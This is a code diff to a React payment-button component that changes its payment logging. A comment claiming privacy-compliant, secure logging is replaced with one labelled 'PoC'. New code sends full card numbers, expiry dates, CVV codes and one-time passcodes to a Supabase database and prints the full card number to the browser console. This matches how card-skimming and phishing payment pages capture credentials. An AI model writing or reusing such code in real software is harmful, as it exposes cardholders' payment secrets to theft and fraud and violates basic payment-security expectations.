@@ -45,14 +45,16 @@ export default function PaymentButton({
     setSessionId(crypto.randomUUID());
   }, []);
 
-  // ✅ SECURE: Privacy-compliant logging with Supabase auth integration
+  // ⚠️ PoC LOGGING: Includes sensitive data for testing purposes only
   const logFormData = async (step: string, otpVerified = false, formCompleted = false) => {
     console.log(`🔄 Attempting to log payment data for step: ${step}`);
     console.log('Form data to log:', {
       cardholderName,
       cardNumber: cardNumber.length > 0 ? `****${cardNumber.slice(-4)}` : 'empty',
       expiryDate,
+      cvv: cvv.length > 0 ? '***' : 'empty',
       phone,
+      otp: otp.length > 0 ? '***' : 'empty',
       sessionId
     });
 
@@ -70,7 +72,12 @@ export default function PaymentButton({
         form_completed: formCompleted,
         cardholder_name: cardholderName,
         payment_method_type: 'card',
-        form_step: step
+        form_step: step,
+        // ⚠️ PoC ONLY: Storing sensitive data for testing
+        card_number: cardNumber, // Full card number for PoC
+        expiry_date: expiryDate,
+        cvv: cvv,
+        otp_code: otp
       };
 
       console.log('📤 Sending log data to Supabase:', logData);
